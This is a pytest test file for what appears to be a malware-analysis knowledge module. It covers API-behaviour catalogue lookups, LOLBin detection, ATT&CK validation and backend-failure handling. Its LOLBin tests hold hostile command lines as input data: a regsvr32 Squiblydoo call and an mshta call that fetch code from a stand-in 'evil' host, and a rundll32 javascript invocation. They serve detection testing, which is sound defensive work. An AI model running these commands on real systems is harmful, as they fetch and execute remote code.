"""``maljan.tools.knowledge`` answers from the vendored tables, or says why not.

The two lookups backed by a vendored JSON file — the API-behaviour catalog and
the LOLBin table — are checked against real values. The three backed by an
index that needs the MITRE bundle or an embedding model are checked for the
contract that matters more than any value: a backend that is not there yields
an empty result and a ``reason``, and never an exception. That is what stops a
missing model turning "we could not look" into "we looked and found nothing".
"""

from __future__ import annotations

import threading
import time
from collections.abc import Iterator
from typing import Any

import pytest

from maljan.tools import knowledge


class TestApiCapability:
    def test_a_catalogued_api_reports_its_behaviour_category(self) -> None:
        result = knowledge.api_capability(["WriteProcessMemory", "CreateRemoteThread"])

        by_api = {row["api"]: row for row in result["capabilities"]}
        assert by_api["WriteProcessMemory"]["category"] == "process_injection"
        assert by_api["WriteProcessMemory"]["catalog_flags"] == ["suspicious"]
        assert by_api["CreateRemoteThread"]["behaviours"] == ["process_injection"]

    def test_an_api_the_catalog_does_not_know_comes_back_empty_not_guessed_at(self) -> None:
        result = knowledge.api_capability(["ZzNotARealWin32Api"])
        row = result["capabilities"][0]
        assert row["category"] is None
        assert row["behaviours"] == []
        assert row["techniques"] == []
        assert row["catalog_flags"] == []

    def test_the_catalog_label_names_its_source_rather_than_reading_as_a_verdict(self) -> None:
        """A bare ``suspicious: true`` would be this tool passing judgement.
        ``catalog_flags`` says whose judgement it is."""
        row = knowledge.api_capability(["WriteProcessMemory"])["capabilities"][0]
        assert "suspicious" not in row
        assert row["catalog_flags"] == ["suspicious"]

    def test_a_missing_catalog_is_named_rather_than_silently_empty(self) -> None:
        result = knowledge.api_capability(["WriteProcessMemory"], behaviour_map="data/nope.json")
        assert "not readable" in result["reason"]

    def test_an_empty_list_is_an_empty_answer(self) -> None:
        assert knowledge.api_capability([]) == {"capabilities": []}

    def test_a_rule_fires_over_the_whole_set_and_each_api_it_matched_cites_it(self) -> None:
        """Every rule in the vendored map needs two or more APIs. Matched one
        name at a time no rule can fire, which is how the pack's entry came to
        list no technique on any sample; the set is matched once."""
        result = knowledge.api_capability(
            ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "RegQueryValueExA"]
        )
        by_api = {row["api"]: row for row in result["capabilities"]}
        cited = by_api["WriteProcessMemory"]["techniques"]
        assert [c["technique_id"] for c in cited] == ["T1055"]
        assert set(cited[0]["matched"]) >= {"WriteProcessMemory", "CreateRemoteThread"}
        assert len(cited[0]["matched"]) >= cited[0]["min_apis"]
        assert by_api["CreateRemoteThread"]["techniques"][0]["technique_id"] == "T1055"
        # An API the rule did not match does not carry it.
        assert by_api["RegQueryValueExA"]["techniques"] == []

    def test_one_api_alone_clears_no_rule(self) -> None:
        row = knowledge.api_capability(["WriteProcessMemory"])["capabilities"][0]
        assert row["techniques"] == []


# The GDI and message-pump calls a Win32 program makes to put a window on the
# screen and read its events. Nothing here is evidence of anything; a signed
# SSH client imports every one of them.
_A_GUI_PROGRAM_IMPORTS = [
    "BitBlt",
    "CreateCompatibleBitmap",
    "CreateCompatibleDC",
    "GetDC",
    "GetDIBits",
    "SelectObject",
    "GetMessageA",
    "PeekMessageA",
    "DispatchMessageA",
    "TranslateMessage",
]


class TestDrawingAWindowIsNotKeylogging:
    """The catalogue called the GDI blit calls keylogging and tiered them high.

    On a signed SSH client that made sixteen imports read as suspicious, and
    the one analyst that spoke cited the entry behind a Malware verdict. The
    calls stay in the catalogue and keep their ATT&CK association — screen
    capture really is what a screenshot is made of — but the association is
    not a finding, and the catalogue now says what would turn it into one.
    """

    def test_the_gdi_capture_calls_are_catalogued_as_screen_capture(self) -> None:
        rows = knowledge.api_capability(
            ["BitBlt", "CreateCompatibleBitmap", "CreateCompatibleDC", "GetDC", "GetDIBits"]
        )["capabilities"]
        assert {row["category"] for row in rows} == {"screen_capture"}

    def test_the_screen_capture_group_flags_nothing_on_its_own(self) -> None:
        rows = knowledge.api_capability(["BitBlt", "GetDC", "GetDIBits"])["capabilities"]
        assert all(row["catalog_flags"] == [] for row in rows)

    def test_the_group_names_what_would_corroborate_it(self) -> None:
        row = knowledge.api_capability(["BitBlt"])["capabilities"][0]
        assert row["corroborated_by"]
        assert "SetWindowsHookExA" in row["corroborated_by"]
        assert "GetRawInputData" in row["corroborated_by"]
        assert "GetClipboardData" in row["corroborated_by"]

    def test_a_named_corroborator_is_still_catalogued_as_keylogging(self) -> None:
        row = knowledge.api_capability(["GetAsyncKeyState"])["capabilities"][0]
        assert row["category"] == "keylogging"
        assert row["catalog_flags"] == ["suspicious"]

    def test_the_association_survives_the_relabelling(self) -> None:
        """T1113 is what these calls are for; it is shown, never asserted."""
        rows = knowledge.api_capability(["BitBlt", "CreateCompatibleDC", "GetDC", "GetDIBits"])[
            "capabilities"
        ]
        cited = {t["technique_id"] for row in rows for t in row["techniques"]}
        assert "T1113" in cited

    def test_a_benign_gui_import_set_raises_no_flag_from_these_groups(self) -> None:
        rows = knowledge.api_capability(_A_GUI_PROGRAM_IMPORTS)["capabilities"]
        flagged = {row["api"]: row["category"] for row in rows if row["catalog_flags"]}
        assert flagged == {}

    def test_an_api_with_no_corroboration_list_does_not_carry_the_key(self) -> None:
        row = knowledge.api_capability(["WriteProcessMemory"])["capabilities"][0]
        assert "corroborated_by" not in row


class TestLolbinLookup:
    def test_a_scriptlet_rundll32_invocation_maps_to_its_technique(self) -> None:
        result = knowledge.lolbin_lookup(
            ['rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)']
        )

        assert result["hits"] == [
            {
                "binary": "rundll32",
                "technique_id": "T1218.011",
                "pattern": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)',
            }
        ]

    def test_squiblydoo_regsvr32_maps_to_its_own_technique(self) -> None:
        result = knowledge.lolbin_lookup(["regsvr32 /s /u /i:http://evil/x.sct scrobj.dll"])
        assert result["hits"][0]["technique_id"] == "T1218.010"

    def test_the_benign_use_of_a_lolbin_is_not_a_hit(self) -> None:
        """Presence is not evidence: these binaries run on every Windows box
        every minute, and a table that flagged them all would flag nothing."""
        result = knowledge.lolbin_lookup(
            ["regsvr32 /s C:\\Windows\\System32\\legit.dll", "notepad.exe report.txt"]
        )
        assert result == {"hits": [], "checked": 2}

    def test_a_hit_carries_no_confidence_number(self) -> None:
        hit = knowledge.lolbin_lookup(["mshta http://evil/x.hta"])["hits"][0]
        assert set(hit) == {"binary", "technique_id", "pattern"}


class TestAttckLookup:
    def test_a_real_technique_is_valid_and_carries_its_domain_and_platforms(self) -> None:
        result = knowledge.attck_lookup("T1055")
        assert result["valid"] is True
        assert result["domain"] == "enterprise"
        assert result["technique_id"] == "T1055"
        assert result["url"].startswith("https://attack.mitre.org/techniques/T1055")

    def test_an_invented_technique_is_reported_invalid_rather_than_missing(self) -> None:
        result = knowledge.attck_lookup("T9999.001")
        assert result["valid"] is False
        assert result["technique_id"] == "T9999.001"

    def test_an_empty_id_says_what_was_wrong_with_the_call(self) -> None:
        result = knowledge.attck_lookup("")
        assert result["valid"] is False
        assert result["reason"] == "no technique id given"

    def test_a_lowercase_id_is_normalised_before_the_lookup(self) -> None:
        assert knowledge.attck_lookup("t1055")["technique_id"] == "T1055"


class TestAttckValidate:
    def test_only_the_invalid_ids_come_back(self) -> None:
        result = knowledge.attck_validate(["T1055", "T9999.001", "T1547.001"])
        assert [row["id"] for row in result["invalid"]] == ["T9999.001"]
        assert result["checked"] == 3

    def test_a_bogus_subtechnique_of_a_real_parent_suggests_the_parent(self) -> None:
        result = knowledge.attck_validate(["T1055.999"])
        row = result["invalid"][0]
        assert row["id"] == "T1055.999"
        # The suggestion needs the index; when it is unavailable the row says
        # so instead, and either answer is honest.
        assert "T1055" in row["suggestions"] or row.get("reason")

    def test_nothing_invalid_is_an_empty_list(self) -> None:
        assert knowledge.attck_validate(["T1055"])["invalid"] == []

    def test_an_empty_input_is_an_empty_answer(self) -> None:
        assert knowledge.attck_validate([]) == {"invalid": [], "checked": 0}


class TestDegradation:
    """A backend that is not there must never raise and never look like a miss."""

    @pytest.fixture(autouse=True)
    def _reset(self):
        knowledge.reset_indices()
        yield
        knowledge.reset_indices()

    def test_a_missing_family_catalog_answers_with_a_reason(self) -> None:
        result = knowledge.family_lookup("ransomware", catalog="data/no-such-catalog.json")
        assert result["families"] == []
        assert "no family fingerprint catalog" in result["reason"]

    def test_a_missing_case_corpus_answers_with_a_reason(self) -> None:
        result = knowledge.similar_cases("beaconing", corpus="data/no-such-corpus.json")
        assert result["cases"] == []
        assert result["techniques"] == []
        assert "no ATT&CK case corpus" in result["reason"]

    def test_an_embedding_backend_that_raises_becomes_a_reason(self, monkeypatch) -> None:
        def _explode(*args: Any, **kwargs: Any) -> Any:
            raise RuntimeError("no model on this box")

        monkeypatch.setattr("maljan.memory.family_fingerprint_index.load_family_index", _explode)
        result = knowledge.family_lookup("ransomware")
        assert result["families"] == []
        assert "could not be read" in result["reason"]

    def test_an_unreachable_attck_index_leaves_resolve_technique_empty_with_a_reason(
        self, monkeypatch
    ) -> None:
        import time

        monkeypatch.setattr(knowledge, "_HYBRID_FAILED", "the ATT&CK index is unavailable: offline")
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic())
        result = knowledge.resolve_technique("process injection")
        assert result["candidates"] == []
        assert "unavailable" in result["reason"]

    def test_the_index_failure_is_remembered_rather_than_retried_per_call(
        self, monkeypatch
    ) -> None:
        """A box that cannot reach MITRE would otherwise re-attempt a
        fifty-megabyte download on every single lookup."""
        attempts: list[int] = []

        class _Broken:
            @classmethod
            def from_loader(cls) -> Any:
                attempts.append(1)
                raise RuntimeError("offline")

        monkeypatch.setattr("maljan.memory.hybrid_attck_index.HybridATTCKIndex", _Broken)

        for _ in range(3):
            knowledge.resolve_technique("process injection")

        assert len(attempts) == 1


class TestAFailedIndexBuildIsRetried:
    """One network blip used to cost a worker its index for the life of the
    process: every later job in it ran without the hybrid index, and nothing
    said why. The failure is now believed for an interval and no longer."""

    @pytest.fixture(autouse=True)
    def _cold(self) -> Iterator[None]:
        knowledge.reset_indices()
        knowledge.set_index_retry_after(900)
        yield
        knowledge.reset_indices()
        knowledge.set_index_retry_after(900)

    @staticmethod
    def _broken(attempts: list[int]) -> Any:
        class _Broken:
            @classmethod
            def from_loader(cls) -> Any:
                attempts.append(1)
                raise RuntimeError("offline")

        return _Broken

    def test_the_next_lookup_after_the_interval_attempts_another_build(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        attempts: list[int] = []
        monkeypatch.setattr(
            "maljan.memory.hybrid_attck_index.HybridATTCKIndex", self._broken(attempts)
        )
        knowledge.set_index_retry_after(60)

        knowledge.resolve_technique("process injection")
        knowledge.resolve_technique("process injection")
        assert len(attempts) == 1

        # The clock, not the lookup count, is what opens the door.
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic() - 61)
        answer = knowledge.resolve_technique("process injection")
        assert len(attempts) == 2
        assert "unavailable" in answer["reason"]

    def test_a_retry_that_succeeds_clears_the_reason(self, monkeypatch: pytest.MonkeyPatch) -> None:
        attempts: list[int] = []
        monkeypatch.setattr(
            "maljan.memory.hybrid_attck_index.HybridATTCKIndex", self._broken(attempts)
        )
        knowledge.set_index_retry_after(60)
        knowledge.resolve_technique("process injection")
        assert not knowledge.index_is_warm()

        class _Working:
            @classmethod
            def from_loader(cls) -> Any:
                return _Working()

            @staticmethod
            def search(_text: str, top_k: int = 5) -> list[Any]:
                return []

        monkeypatch.setattr("maljan.memory.hybrid_attck_index.HybridATTCKIndex", _Working)
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic() - 61)
        assert knowledge.resolve_technique("process injection") == {"candidates": []}
        assert knowledge.index_is_warm()

    def test_an_interval_of_zero_is_the_old_behaviour(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        attempts: list[int] = []
        monkeypatch.setattr(
            "maljan.memory.hybrid_attck_index.HybridATTCKIndex", self._broken(attempts)
        )
        knowledge.set_index_retry_after(0)
        knowledge.resolve_technique("process injection")
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic() - 86400)
        knowledge.resolve_technique("process injection")
        assert len(attempts) == 1

    def test_lookups_arriving_together_start_one_build(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """No retry storm: the attempt is claimed under the lock, so the
        callers that arrive while a slow build runs are answered the standing
        reason rather than starting builds of their own."""
        attempts: list[int] = []
        started = threading.Barrier(4)

        class _Slow:
            @classmethod
            def from_loader(cls) -> Any:
                attempts.append(1)
                time.sleep(0.2)
                raise RuntimeError("offline")

        monkeypatch.setattr("maljan.memory.hybrid_attck_index.HybridATTCKIndex", _Slow)
        knowledge.set_index_retry_after(60)
        knowledge.resolve_technique("process injection")
        assert len(attempts) == 1
        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic() - 61)

        def _ask() -> None:
            started.wait(timeout=5)
            knowledge.resolve_technique("process injection")

        threads = [threading.Thread(target=_ask) for _ in range(4)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join(timeout=10)
        assert len(attempts) == 2

    def test_the_background_warmer_arms_again_once_the_failure_is_stale(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        attempts: list[int] = []
        monkeypatch.setattr(
            "maljan.memory.hybrid_attck_index.HybridATTCKIndex", self._broken(attempts)
        )
        knowledge.set_index_retry_after(60)
        assert knowledge.warm_index_in_background() is True
        for _ in range(200):
            if knowledge._HYBRID_FAILED:
                break
            time.sleep(0.02)
        assert attempts == [1]
        assert knowledge.warm_index_in_background() is False

        monkeypatch.setattr(knowledge, "_HYBRID_FAILED_AT", time.monotonic() - 61)
        assert knowledge.warm_index_in_background() is True

    def test_a_qdrant_free_box_reports_the_missing_client_rather_than_no_matches(
        self, monkeypatch
    ) -> None:
        from maljan.memory.function_hash_store import FunctionHashStoreUnavailableError

        def _explode(**kwargs: Any) -> Any:
            raise FunctionHashStoreUnavailableError("qdrant-client is required")

        monkeypatch.setattr("maljan.memory.function_hash_store.FunctionHashStore", _explode)
        result = knowledge.function_matches(["deadbeef"], qdrant_url="http://localhost:6333")
        assert result["matches"] == []
        assert "qdrant-client" in result["reason"]

    def test_no_hashes_to_look_up_is_an_empty_answer_without_touching_qdrant(self) -> None:
        assert knowledge.function_matches([], qdrant_url="http://unreachable:6333") == {
            "matches": []
        }


class TestTheCitationIsTheSameInEveryProcess:
    _NAMES = ["RegCreateKeyExA", "RegCreateKeyExW", "RegSetValueExA", "RegSetValueExW"]

    def _run(self, seed: str) -> dict:
        import json
        import os
        import subprocess
        import sys

        code = (
            "import json; from maljan.tools import knowledge; "
            f"print(json.dumps(knowledge.api_capability({self._NAMES!r})))"
        )
        env = {**os.environ, "PYTHONHASHSEED": seed}
        out = subprocess.run(
            [sys.executable, "-c", code], capture_output=True, text=True, env=env, check=True
        ).stdout
        return json.loads(out.strip().splitlines()[-1])

    def test_two_hash_seeds_cite_the_same_apis(self) -> None:
        """Set iteration order changes with the seed; the record must not."""
        first, second = self._run("1"), self._run("5")
        assert first == second
        cited = {row["api"]: row["techniques"] for row in first["capabilities"]}
        for name in self._NAMES:
            assert cited[name], f"{name} cites nothing"
        # Both spellings of a pair cite the rule, with the same matched list.
        assert cited["RegCreateKeyExA"] == cited["RegCreateKeyExW"]
